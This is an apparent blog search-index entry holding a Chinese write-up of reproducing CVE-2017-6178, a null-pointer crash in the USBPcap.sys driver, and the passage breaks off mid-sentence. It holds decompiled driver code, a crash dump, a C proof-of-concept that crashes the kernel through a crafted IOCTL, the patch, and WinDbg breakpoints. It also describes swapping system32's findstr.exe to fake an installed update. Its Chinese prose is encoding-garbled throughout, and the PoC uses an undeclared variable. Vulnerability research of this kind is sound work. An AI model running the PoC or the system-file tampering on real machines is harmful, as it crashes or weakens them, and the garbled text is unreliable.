<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>CVE-2017-6178 æ¼æ´å¤ç°</title>
    <link href="/2022/07/26/CVE-2017-6178%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    <url>/2022/07/26/CVE-2017-6178%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<p>å¤ç°<code>CVE-2017-6178</code>æ—¶ï¼Œè¿˜æ˜¯è¸©äº†å¾ˆå¤šå‘çš„</p><h2 id="ç¯å¢ƒ"><a href="#ç¯å¢ƒ" class="headerlink" title="ç¯å¢ƒ"></a>ç¯å¢ƒ</h2><pre><code class="hljs nsis">è™šæ‹Ÿæœºï¼š<span class="hljs-literal">Win7</span> SP1 x86ç‰©ç†æœºï¼š<span class="hljs-literal">Win10</span>debuggerï¼šwindbg previewcompilerï¼švs2022</code></pre><p>ä¸»è¦ä¸ºäº†è·å–<code>x86</code>çš„<code>USBPcap.sys</code>èŠ±è´¹äº†å¾ˆå¤šæ—¶é—´ï¼Œé¦–å…ˆæ ¹æ®<code>CVE-2017-6178</code>çš„æ¼æ´æè¿°ä»¥åŠ<code>exploit-db</code>çš„è¯´æ˜ï¼Œå¯çŸ¥å…¶å®å¯ä»¥é€šè¿‡å®‰è£…<a href="https://2.na.dl.wireshark.org/win32/all-versions/Wireshark-win32-2.2.5.exe">Wireshark-win32-2.2.5.exe</a>å¾—åˆ°<code>USBPcap.sys</code></p><p>ä½†æ˜¯æˆ‘æœ€åˆçš„æ—¶å€™ï¼Œé€šè¿‡<code>Win7 SP x64</code>å®‰è£…ï¼Œä½†æ˜¯è¿™æ ·å¾—åˆ°çš„æ˜¯<code>x64</code>çš„<code>USBPcap.sys</code>ï¼ˆæˆ‘ä¸ç¡®å®šæ˜¯å¦å­˜åœ¨æ´ï¼Œæœ€ååˆ†æå®Œäº†ä¹‹åçœ‹<code>x64</code>ç‰ˆæœ¬æ˜¯æœ‰çš„ï¼Œå…¶å®<code>github</code>ä¸Š<code>1.0.0.7</code>é‡Œé¢ä¹Ÿæœ‰æ´ï¼Œå¯æ˜¯å½“æ—¶æˆ‘æ²¡ç¿»åˆ°è¿™ä¸ªæ–‡ä»¶ğŸ™ƒï¼‰ï¼Œäºæ˜¯æˆ‘æŠŠ<code>x64</code>ä¸Šå¾—åˆ°çš„<code>USBPcapSetup-1.1.0.0-g794bf26-5.exe</code>æ”¾åˆ°<code>win7 x86</code>ä¸Šè¿›è¡Œå®‰è£…ï¼Œæœ€åå¾—åˆ°äº†<code>x86</code>çš„<code>USBPcap.sys</code>ï¼ˆç›´æ¥æ‹¿32ä½çš„<code>wireshark-2.2.5.exe</code>å®‰è£…ä¹Ÿåº”è¯¥å¯ä»¥ï¼‰</p><p>è¿™ä¸ªæ—¶å€™å°±æŠ¥å‡ºï¼Œéœ€è¦å°†<code>win7</code>æ›´æ–°åˆ°å®‰è£…äº†<code>KB3033929</code>çš„ç‰ˆæœ¬ï¼Œä½†æ˜¯æˆ‘å·²ç»å®‰è£…äº†ï¼Œæœ€ååœ¨<code>USBPcap</code>çš„<code>github</code>ä»“åº“çš„<a href="https://github.com/desowin/usbpcap/issues/31">issue</a>ï¼Œæ‰¾åˆ°äº†ä¸€ä¸ªä¼ªè£…è‡ªå·±å·²ç»å®‰è£…äº†<code>KB3033929</code>çš„æ–¹æ³•</p><p>é€šè¿‡åˆ›å»ºä¸€ä¸ªå†…å®¹ä¸º<code>@echo KB3033929</code>çš„<code>findstr.cmd</code>æ–‡ä»¶ï¼Œæ”¾å…¥<code>c:\windows\system32</code>ç›®å½•ï¼Œå¹¶å°†å…¶ç›®å½•ä¸‹çš„<code>findstr.exe</code>ä¿®æ”¹åå­—ï¼Œä»è€Œå®ç°æŸ¥è¯¢æ—¶ï¼Œè¿”å›å·²å®‰è£…çš„ç»“æœ</p><p>æ³¨ï¼šè¿™ä¸ªåœ°æ–¹ï¼Œéœ€è¦é‡å‘½å<code>findstr.exe</code>çš„æ—¶å€™éœ€è¦ä¿®æ”¹<code>findstr.exe</code>æ–‡ä»¶çš„<code>own</code>å’Œèµ‹äºˆ<code>admin</code>æƒé™ï¼Œå‚è€ƒ<a href="https://blog.csdn.net/zy_strive_2012/article/details/79470829">è¿™ç¯‡åšå®¢</a></p><h2 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h2><p>è¿™ä¸ªæ¼æ´å…¶å®æ¯”è¾ƒç®€å•ï¼Œå°±æ˜¯åœ¨è®¾ç½®<code>dispatchHandler</code>æ—¶ï¼Œå¯¹äº<code>IRP_MJ_FILE_SYSTEM_CONTROL 0x0d</code>ï¼Œè¿™ä¸ª<code>handler</code>ä¸­å¤„ç†å‡ºé”™ï¼ˆæ³¨ï¼š<code>sub_1145A</code>å³<code>IRP_MJ_FILE_SYSTEM_CONTROL</code>çš„<code>handler</code>ï¼‰</p><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> __stdcall <span class="hljs-title">sub_1145A</span><span class="hljs-params">(<span class="hljs-keyword">int</span> a1, PVOID Tag)</span></span><span class="hljs-function"></span>&#123;  _DEVICE_OBJECT *v2; <span class="hljs-comment">// edi</span>  <span class="hljs-keyword">int</span> v3; <span class="hljs-comment">// eax</span>  _DEVICE_OBJECT *DriverObject; <span class="hljs-comment">// ecx</span>  NTSTATUS v6; <span class="hljs-comment">// edi</span>  _DEVICE_OBJECT **p_AttachedDevice; <span class="hljs-comment">// [esp-Ch] [ebp-18h]</span>  <span class="hljs-keyword">int</span> v8; <span class="hljs-comment">// [esp+14h] [ebp+8h]</span>  v2 = *(_DEVICE_OBJECT **)(a1 + <span class="hljs-number">40</span>);  v3 = IoAcquireRemoveLockEx((PIO_REMOVE_LOCK)&amp;v2-&gt;AttachedDevice, Tag, &amp;File, <span class="hljs-number">1u</span>, <span class="hljs-number">0x18</span>u);  v8 = v3;  <span class="hljs-keyword">if</span> ( v3 &gt;= <span class="hljs-number">0</span> )  &#123;    DriverObject = (_DEVICE_OBJECT *)v2-&gt;DriverObject;    ++*((_BYTE *)Tag + <span class="hljs-number">35</span>);    *((_DWORD *)Tag + <span class="hljs-number">24</span>) += <span class="hljs-number">36</span>;    p_AttachedDevice = &amp;v2-&gt;AttachedDevice;    v6 = IofCallDriver(DriverObject, (PIRP)Tag);<span class="hljs-comment">// vuln</span>    IoReleaseRemoveLockEx((PIO_REMOVE_LOCK)p_AttachedDevice, Tag, <span class="hljs-number">0x18</span>u);    <span class="hljs-keyword">return</span> v6;  &#125;  <span class="hljs-keyword">else</span>  &#123;    sub_11434((PIRP)Tag, v3, <span class="hljs-number">0</span>);    <span class="hljs-keyword">return</span> v8;  &#125;&#125;</code></pre><p>è¿™ä¸ªåœ°æ–¹å¹¶æœªåˆ¤æ–­<code>DriverObject</code>æ˜¯å¦ä¸º<code>NULL</code>ï¼Œè€Œå¯¼è‡´è¿™ä¸ªæœªåˆå§‹åŒ–çš„å€¼ç›´æ¥ä¼ å…¥äº†<code>IofCallDriver</code>ï¼Œä»è€Œå‡ºç°äº†ç©ºæŒ‡é’ˆè§£å¼•ç”¨çš„é”™è¯¯</p><p>æœ€ç»ˆ<code>crash</code>ä½ç½®</p><pre><code class="hljs routeros">Access violation - code c0000005 (!!! second chance !!!)<span class="hljs-attribute">eax</span>=87b91268 <span class="hljs-attribute">ebx</span>=86ff89f0 <span class="hljs-attribute">ecx</span>=0000000d <span class="hljs-attribute">edx</span>=87b911f8 <span class="hljs-attribute">esi</span>=00000000 <span class="hljs-attribute">edi</span>=86ff89e0<span class="hljs-attribute">eip</span>=83e57f7b <span class="hljs-attribute">esp</span>=8a987ac0 <span class="hljs-attribute">ebp</span>=8a987ac8 <span class="hljs-attribute">iopl</span>=0         nv up ei ng nz na po cy<span class="hljs-attribute">cs</span>=0008  <span class="hljs-attribute">ss</span>=0010  <span class="hljs-attribute">ds</span>=0023  <span class="hljs-attribute">es</span>=0023  <span class="hljs-attribute">fs</span>=0030  <span class="hljs-attribute">gs</span>=0000             <span class="hljs-attribute">efl</span>=00010383nt!IofCallDriver+0x57:83e57f7b 8b4608          mov     eax,dword ptr [esi+8] ds:0023:<span class="hljs-attribute">00000008</span>=????????</code></pre><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><p>å› ä¸ºæ˜¯<code>IRP_MJ_FILE_SYSTEM_CONTROL</code>ï¼Œæ‰€ä»¥è¦ç”¨<code>FILE_DEVICE_FILE_SYSTEM</code>çš„<code>IOCTL</code>æ‰å¯ä»¥</p><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> FILE_DEVICE_FILE_SYSTEM         0x00000009</span><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> FILE_DEVICE_UNKNOWN             0x00000022</span></code></pre><p>æœ€ç»ˆ<code>POC</code>æ˜¯ç›´æ¥ç”¨çš„<a href="https://github.com/k0keoyo/try_exploit/blob/master/_cve_2017_6178_poc/_CVE_2017_6178_PoC.cpp"> k0keoyoå¸ˆå‚…çš„POC </a></p><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;windows.h&gt;</span></span><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> *argv[])</span></span><span class="hljs-function"></span>&#123;    HANDLE hDevice;    DWORD dwRetBytes = <span class="hljs-number">0</span>;    hDevice = CreateFile(<span class="hljs-string">&quot;\\\\.\\USBPcap1&quot;</span>, <span class="hljs-number">0</span>, FILE_SHARE_READ | FILE_SHARE_WRITE, <span class="hljs-literal">NULL</span>, OPEN_EXISTING, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>);    <span class="hljs-keyword">if</span> (hDevice == INVALID_HANDLE_VALUE)    &#123;        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[-] CreateFile failed (%.08x)\n&quot;</span>, GetLastError());        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;    &#125;    bResult = DeviceIoControl(hDevice, <span class="hljs-number">0x00090000</span>,(LPVOID)<span class="hljs-number">0x1</span>, (DWORD)<span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, &amp;dwRetBytes, <span class="hljs-literal">NULL</span>);    <span class="hljs-keyword">if</span> (!bResult)    &#123;        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[-] DeviceIOControl failed (%.08x)\n&quot;</span>,GetLastError());        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;    &#125;    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] if show this info ,PoC is failed:(\n\n&quot;</span>);    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre><h2 id="patch"><a href="#patch" class="headerlink" title="patch"></a>patch</h2><p>ä¿®å¤è¿™ä¸ªæ¼æ´ä¹Ÿå¾ˆç®€å•ï¼Œå°±æ˜¯åˆ¤æ–­ä¸€ä¸‹è¿™ä¸ª<code>DriverObject</code>æ˜¯ä¸æ˜¯åˆå§‹åŒ–çš„<code>NULL</code></p><pre><code class="hljs c"><span class="hljs-function">NTSTATUS __stdcall <span class="hljs-title">sub_402038</span><span class="hljs-params">(<span class="hljs-keyword">int</span> a1, PVOID Tag)</span></span><span class="hljs-function"></span>&#123;  _DEVICE_OBJECT *v2; <span class="hljs-comment">// ebx</span>  <span class="hljs-keyword">int</span> v3; <span class="hljs-comment">// eax</span>  NTSTATUS v4; <span class="hljs-comment">// edi</span>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">DEVICE_OBJECT</span> *<span class="hljs-title">DriverObject</span>;</span> <span class="hljs-comment">// ecx</span>  v2 = *(_DEVICE_OBJECT **)(a1 + <span class="hljs-number">40</span>);  v3 = IoAcquireRemoveLockEx((PIO_REMOVE_LOCK)&amp;v2-&gt;AttachedDevice, Tag, &amp;File, <span class="hljs-number">1u</span>, <span class="hljs-number">0x18</span>u);  v4 = v3;  <span class="hljs-keyword">if</span> ( v3 &gt;= <span class="hljs-number">0</span> )  &#123;    DriverObject = (struct _DEVICE_OBJECT *)v2-&gt;DriverObject;    <span class="hljs-keyword">if</span> ( DriverObject )    &#123;      ++*((_BYTE *)Tag + <span class="hljs-number">35</span>);      *((_DWORD *)Tag + <span class="hljs-number">24</span>) += <span class="hljs-number">36</span>;      v4 = IofCallDriver(DriverObject, (PIRP)Tag);    &#125;    <span class="hljs-keyword">else</span>    &#123;      v4 = <span class="hljs-number">-1073741808</span>;      sub_40201A((PIRP)Tag, <span class="hljs-number">-1073741808</span>, <span class="hljs-number">0</span>);    &#125;    IoReleaseRemoveLockEx((PIO_REMOVE_LOCK)&amp;v2-&gt;AttachedDevice, Tag, <span class="hljs-number">0x18</span>u);  &#125;  <span class="hljs-keyword">else</span>  &#123;    sub_40201A((PIRP)Tag, v3, <span class="hljs-number">0</span>);  &#125;  <span class="hljs-keyword">return</span> v4;&#125;</code></pre><h2 id="è°ƒè¯•"><a href="#è°ƒè¯•" class="headerlink" title="è°ƒè¯•"></a>è°ƒè¯•</h2><p>è°ƒè¯•è¿™è¾¹è¸©å‘ç‰¹åˆ«å¤šï¼Œæœ€åˆå¯¹<code>DeviceIoControl</code>çš„æµç¨‹ä¸ç†è§£çš„æ—¶å€™ï¼Œä¸‹æ–­ç‚¹çš„æ—¶å€™ï¼Œä¸€ç›´å‚ç…§å…¶ä»–çš„è°ƒè¯•é©±åŠ¨å‡ºé”™æ—¶çš„<code>nt!NtDeviceIoControlFile</code>å‡½æ•°ä¸­ä¸‹æ–­ç‚¹</p><p>æœ€åˆæ˜¯ä»¥ä¸ºæ˜¯ï¼Œè‡ªå·±çš„æ¡ä»¶æ–­ç‚¹ä¸ç†Ÿç»ƒï¼Œä»¥åŠ<code>offset=0</code>æ—¶ï¼Œè¿™ä¸ª<code>ebp</code>è¿˜ä¸æ˜¯åç»­çš„<code>ebp</code>æ‰€ä»¥å‡ºé”™</p><pre><code class="hljs x86asm">nt!NtDeviceIoControlFile:840a07a9 8bff            <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">edi</span>,<span class="hljs-built_in">edi</span>840a07ab <span class="hljs-number">55</span>              <span class="hljs-keyword">push</span>    <span class="hljs-built_in">ebp</span>840a07ac 8bec            <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">ebp</span>,<span class="hljs-built_in">esp</span>840a07ae 6a01            <span class="hljs-keyword">push</span>    <span class="hljs-number">1</span>840a07b0 ff752c          <span class="hljs-keyword">push</span>    <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">ebp</span>+<span class="hljs-number">2Ch</span>]840a07b3 ff7528          <span class="hljs-keyword">push</span>    <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">ebp</span>+<span class="hljs-number">28h</span>]840a07b6 ff7524          <span class="hljs-keyword">push</span>    <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">ebp</span>+<span class="hljs-number">24h</span>]840a07b9 ff7520          <span class="hljs-keyword">push</span>    <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">ebp</span>+<span class="hljs-number">20h</span>]840a07bc ff751c          <span class="hljs-keyword">push</span>    <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">ebp</span>+<span class="hljs-number">1Ch</span>]840a07bf ff7518          <span class="hljs-keyword">push</span>    <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">ebp</span>+<span class="hljs-number">18h</span>]840a07c2 ff7514          <span class="hljs-keyword">push</span>    <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">ebp</span>+<span class="hljs-number">14h</span>]840a07c5 ff7510          <span class="hljs-keyword">push</span>    <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">ebp</span>+<span class="hljs-number">10h</span>]840a07c8 ff750c          <span class="hljs-keyword">push</span>    <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">ebp</span>+<span class="hljs-number">0Ch</span>]840a07cb ff7508          <span class="hljs-keyword">push</span>    <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">ebp</span>+<span class="hljs-number">8</span>]840a07ce e8a682fbff      <span class="hljs-keyword">call</span>    nt!IopXxxControlFile (84058a79)840a07d3 <span class="hljs-number">5d</span>              <span class="hljs-keyword">pop</span>     <span class="hljs-built_in">ebp</span>840a07d4 c22800          <span class="hljs-keyword">ret</span>     <span class="hljs-number">28h</span></code></pre><p>åæ¥æ‰å‘ç°æ˜¯å› ä¸ºï¼Œè¿™ä¸ª<code>DeviceIoControl</code>å› ä¸ºæ˜¯<code>#define FILE_DEVICE_FILE_SYSTEM         0x00000009</code>ï¼Œæ‰€ä»¥èµ°çš„æ˜¯å¦å¤–ä¸€æ¡è·¯ï¼Œåº”è¯¥æ˜¯åœ¨<code>nt!NtFsControlFile</code>ä¸­ä¸‹æ–­ç‚¹</p><p>æœ€ç»ˆæ¡ä»¶æ–­ç‚¹çš„æŒ‡ä»¤ä¸º</p><pre><code class="hljs apache"><span class="hljs-attribute">bp</span> nt!NtFsControlFile+<span class="hljs-number">0</span>x<span class="hljs-number">25</span> <span class="hljs-string">&quot;.printf\&quot;IOCTL:%p\&quot;,dwo(esp+0x14);.echo;g&quot;</span><span class="hljs-attribute">bp</span> nt!NtFsControlFile+<span class="hljs-number">0</span>x<span class="hljs-number">25</span> <span class="hljs-string">&quot;.if(dwo(esp+0x14)=0x00090000)&#123;&#125;.else&#123;gc;&#125;&quot;</span><span class="hljs-attribute">bp</span> nt!IofCallDriver+<span class="hljs-number">60</span> <span class="hljs-string">&quot;.if(ecx=0xd)&#123;&#125;.else&#123;gc;&#125;&quot;</span></code></pre><p>è¿™ä¸ªåœ°æ–¹ä¹Ÿå¯ä»¥ç”¨<code>poi</code>ï¼Œå…³äº<a href="https://stackoverflow.com/questions/37991872/how-to-reference-32bit-integer-data-in-a-64-bit-dump">dwo qwo poiçš„åŒºåˆ«</a>ï¼Œ<a href="https://stackoverflow.com/questions/6097157/conditional-breakpoint-that-tests-multiple-stack-variables">å¤šä¸ªæ¡ä»¶çš„æ–­ç‚¹</a>ï¼Œ<a href="https://blogs.keysight.com/blogs/tech/nwvs.entry.html/2020/07/27/debugging_malwarewi-hk5u.html">echo</a></p><h2 id="è¯¥POCçš„æ•´ä¸ªæµç¨‹"><a href="#è¯¥POCçš„æ•´ä¸ªæµç¨‹" class="headerlink" title="è¯¥POCçš„æ•´ä¸ªæµç¨‹"></a>è¯¥POCçš„æ•´ä¸ªæµç¨‹</h2><p>ä¸ºäº†è°ƒè¯•å¼„æ¸…<code>DeviceIoControl</code>ä»ç”¨æˆ·æ€å¦‚ä½•åˆ°äº†é©±åŠ¨çš„<code>dispatch Handler</code>ï¼Œæˆ‘åœ¨å¦‚ä¸‹åœ°æ–¹ä¸‹äº†æ–­ç‚¹</p><pre><code class="hljs armasm"><span class="hljs-keyword">bp</span> kernel32!DeviceIoControl<span class="hljs-keyword">bp</span> kernel32!DeviceIoControlImplementation<span class="hljs-keyword">bp</span> kernelbase!DeviceIoControl</code></pre><p>å‘ç°é¦–å…ˆä¼šæ–­åœ¨<code>kernel32!DeviceIoControlImplementation</code>ï¼Œå†æ˜¯<code>kernel32!DeviceIoControl</code>ï¼Œæœ€åæ˜¯<code>kernelbase!DeviceIoControl</code></p><p>å› æ­¤è¯¥æµç¨‹åº”è¯¥å¦‚ä¸‹</p><p>ç”¨æˆ·æ€çš„<code>DeviceIoControl</code> </p><p>=&gt; å†…æ ¸çš„<code>ntoskrnl.exe</code>çš„<code>ZwDeviceIoControl</code>å‡½æ•°ï¼ˆé€šè¿‡<code>call KiSystemService</code>ï¼‰ </p><pre><code class="hljs c"><span class="hljs-function">NTSTATUS __stdcall <span class="hljs-title">ZwDeviceIoControlFile</span><span class="hljs-params">(...)</span></span><span class="hljs-function"></span>&#123;  __readeflags();  <span class="hljs-keyword">return</span> KiSystemService(<span class="hljs-number">8</span>);&#125;</code></pre><p>=&gt; å†…æ ¸<code>kernel32.dll</code>çš„<code>DeviceIoControlImplementation</code>ï¼ˆé€šè¿‡<code>call DeviceIoControl</code>ï¼‰</p><pre><code class="hljs c"><span class="hljs-function">BOOL __stdcall <span class="hljs-title">DeviceIoControlImplementation</span><span class="hljs-params">(...)</span></span><span class="hljs-function"></span>&#123;  DWORD v8; <span class="hljs-comment">// esi</span>  NTSTATUS v10; <span class="hljs-comment">// eax</span>  v8 = dwIoControlCode;  <span class="hljs-keyword">if</span> ( dwIoControlCode != <span class="hljs-number">0x2D4808</span> &amp;&amp; dwIoControlCode != <span class="hljs-number">0x74808</span> &amp;&amp; dwIoControlCode != <span class="hljs-number">0x90020</span>    || NtCurrentTeb()-&gt;ProcessEnvironmentBlock-&gt;SessionId == MEMORY[<span class="hljs-number">0x7FFE02D8</span>] )  &#123;    <span class="hljs-keyword">return</span> DeviceIoControl(...);  &#125;  v10 = IsTSAppCompatEnabled((BOOL *)&amp;dwIoControlCode);  <span class="hljs-keyword">if</span> ( v10 &gt;= <span class="hljs-number">0</span> )  &#123;    <span class="hljs-keyword">if</span> ( dwIoControlCode &amp;&amp; !IsCallerAdminOrSystem() )    &#123;      BaseSetLastNTError(<span class="hljs-number">-1073741790</span>);      <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;    &#125;    <span class="hljs-keyword">return</span> DeviceIoControl(...);  &#125;  BaseSetLastNTError(v10);  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre><p>=&gt; å†…æ ¸<code>kernel32.dll</code>çš„<code>DeviceIoControl</code>ï¼ˆé€šè¿‡<code>plt</code>ï¼‰</p><pre><code class="hljs c"><span class="hljs-comment">// attributes: thunk</span><span class="hljs-function">BOOL __stdcall <span class="hljs-title">DeviceIoControl</span><span class="hljs-params">(...)</span></span><span class="hljs-function"></span>&#123;  <span class="hljs-keyword">return</span> __imp__DeviceIoControl@<span class="hljs-number">32</span>(...);&#125;</code></pre><p>=&gt; å†…æ ¸<code>kernelbase.dll</code>çš„<code>DeviceIoControl</code>ï¼Œåœ¨è¯¥å‡½æ•°é€šè¿‡åˆ¤æ–­æ˜¯å¦ä¸º<code>FILE_DEVICE_FILE_SYSTEM</code>è€Œåˆ¤æ–­è¿›<code>NtFsControlFile</code>è¿˜æ˜¯<code>NtDeviceIoControlFile</code></p><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> FILE_DEVICE_FILE_SYSTEM         0x00000009</span><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> FILE_DEVICE_UNKNOWN             0x00000022</span></code></pre><pre><code class="hljs c"><span class="hljs-function">BOOL __stdcall <span class="hljs-title">DeviceIoControl</span><span class="hljs-params">(</span></span><span class="hljs-function"><span class="hljs-params">        HANDLE hDevice,</span></span><span class="hljs-function"><span class="hljs-params">        DWORD dwIoControlCode,</span></span><span class="hljs-function"><span class="hljs-params">        LPVOID lpInBuffer,</span></span><span class="hljs-function"><span class="hljs-params">        DWORD nInBufferSize,</span></span><span class="hljs-function"><span class="hljs-params">        LPVOID lpOutBuffer,</span></span><span class="hljs-function"><span class="hljs-params">        DWORD nOutBufferSize,</span></span><span class="hljs-function"><span class="hljs-params">        LPDWORD lpBytesReturned,</span></span><span class="hljs-function"><span class="hljs-params">        LPOVERLAPPED lpOverlapped)</span></span><span class="hljs-function"></span>&#123;  HANDLE hEvent; <span class="hljs-comment">// eax</span>  <span class="hljs-keyword">int</span> v9; <span class="hljs-comment">// eax</span>  <span class="hljs-keyword">int</span> Status; <span class="hljs-comment">// eax</span>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_STATUS_BLOCK</span> <span class="hljs-title">IoStatusBlock</span>;</span> <span class="hljs-comment">// [esp+10h] [ebp-20h] BYREF</span>  CPPEH_RECORD ms_exc; <span class="hljs-comment">// [esp+18h] [ebp-18h]</span>  <span class="hljs-keyword">if</span> ( !lpOverlapped )  &#123;    <span class="hljs-keyword">if</span> ( (dwIoControlCode &amp; <span class="hljs-number">0xFFFF0000</span>) == <span class="hljs-number">0x90000</span> )      Status = NtFsControlFile(                 hDevice,                 <span class="hljs-number">0</span>,                 <span class="hljs-number">0</span>,                 <span class="hljs-number">0</span>,                 &amp;IoStatusBlock,                 dwIoControlCode,                 lpInBuffer,                 nInBufferSize,                 lpOutBuffer,                 nOutBufferSize);    <span class="hljs-keyword">else</span>      Status = NtDeviceIoControlFile(                 hDevice,                 <span class="hljs-number">0</span>,                 <span class="hljs-number">0</span>,                 <span class="hljs-number">0</span>,                 &amp;IoStatusBlock,                 dwIoControlCode,                 lpInBuffer,                 nInBufferSize,                 lpOutBuffer,                 nOutBufferSize);    <span class="hljs-keyword">if</span> ( Status == <span class="hljs-number">0x103</span> )    &#123;      Status = NtWaitForSingleObject(hDevice, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);      <span class="hljs-keyword">if</span> ( Status &lt; <span class="hljs-number">0</span> )      &#123;LABEL_15:        <span class="hljs-keyword">if</span> ( (Status &amp; <span class="hljs-number">0xC0000000</span>) != <span class="hljs-number">-1073741824</span> )          *lpBytesReturned = IoStatusBlock.Information;        BaseSetLastNTError(Status);        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;      &#125;      Status = IoStatusBlock.Status;    &#125;    <span class="hljs-keyword">if</span> ( Status &gt;= <span class="hljs-number">0</span> )    &#123;      *lpBytesReturned = IoStatusBlock.Information;      <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;    &#125;    <span class="hljs-keyword">goto</span> LABEL_15;  &#125;  ....  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre><p>å¦‚æœæ˜¯<code>NtDeviceIoControlFile</code>çš„è¯</p><pre><code class="hljs excel">=&gt; å†…æ ¸ ntdll.dll çš„ ZwDeviceIoControlFileï¼ˆ<span class="hljs-built_in">call</span> KiFastSystemCallï¼‰=&gt; å†…æ ¸ ntoskrnl.exe çš„ NtDeviceIoControlFile =&gt; å†…æ ¸ ntoskrnl.exe çš„ IopXxxControlFile</code></pre><p>å¦‚æœæ˜¯<code>NtFsControlFile</code>çš„è¯</p><pre><code class="hljs excel">=&gt; å†…æ ¸ ntdll.dll çš„ ZwFsControlFileï¼ˆ<span class="hljs-built_in">call</span> KiFastSystemCallï¼‰=&gt; å†…æ ¸ ntoskrnl.exe çš„ NtFsControlFile=&gt; å†…æ ¸ ntoskrnl.exe çš„ IopXxxControlFile</code></pre><p><code>IopXxxControlFile</code>å‡½æ•°ä¼šå¯¹<code>IRP</code>è¿›è¡Œå°è£…å’Œåˆ†å‘ï¼Œåœ¨<code>IopXxxControlFile</code>å‡½æ•°ä¸­ä¼šè°ƒç”¨<code>IopSynchronousServiceTail</code>ï¼Œåœ¨<code>IopSynchronousServiceTail</code>ä¸­ä¼šè°ƒç”¨<code>IofCallDriver</code></p><p>åœ¨<code>IofCallDriver</code>ä¸­ï¼Œå¯¹äºä¸åŒçš„<code>v5</code>è°ƒç”¨ä¹‹å‰é©±åŠ¨ä¸­è®¾ç½®å¥½çš„<code>dispatch Handler</code></p><pre><code class="hljs c"><span class="hljs-function">NTSTATUS __fastcall <span class="hljs-title">IofCallDriver</span><span class="hljs-params">(PDEVICE_OBJECT DeviceObject, PIRP Irp)</span></span><span class="hljs-function"></span>&#123;  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> v4; <span class="hljs-comment">// eax</span>  <span class="hljs-keyword">unsigned</span> __int8 v5; <span class="hljs-comment">// cl</span>  <span class="hljs-keyword">char</span> v6; <span class="hljs-comment">// al</span>  <span class="hljs-keyword">void</span> *retaddr; <span class="hljs-comment">// [esp+Ch] [ebp+4h]</span>  <span class="hljs-keyword">if</span> ( pIofCallDriver )    <span class="hljs-keyword">return</span> pIofCallDriver(DeviceObject, Irp, retaddr);  <span class="hljs-keyword">if</span> ( --Irp-&gt;CurrentLocation &lt;= <span class="hljs-number">0</span> )    KeBugCheckEx(<span class="hljs-number">0x35</span>u, (ULONG_PTR)Irp, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);  v4 = Irp-&gt;Tail.Overlay.PacketType - <span class="hljs-number">36</span>;  Irp-&gt;Tail.Overlay.PacketType = v4;  v5 = *(_BYTE *)v4;  *(_DWORD *)(v4 + <span class="hljs-number">20</span>) = DeviceObject;  <span class="hljs-keyword">if</span> ( v5 == <span class="hljs-number">22</span> &amp;&amp; ((v6 = *(_BYTE *)(v4 + <span class="hljs-number">1</span>), v6 == <span class="hljs-number">2</span>) || v6 == <span class="hljs-number">3</span>) )    <span class="hljs-keyword">return</span> IopPoHandleIrp();  <span class="hljs-keyword">else</span>    <span class="hljs-keyword">return</span> DeviceObject-&gt;DriverObject-&gt;MajorFunction[v5](DeviceObject, Irp);&#125;</code></pre><p>å…¶æ±‡ç¼–ä¸º<code>call    dword ptr [eax+ecx*4+38h] : ecx = 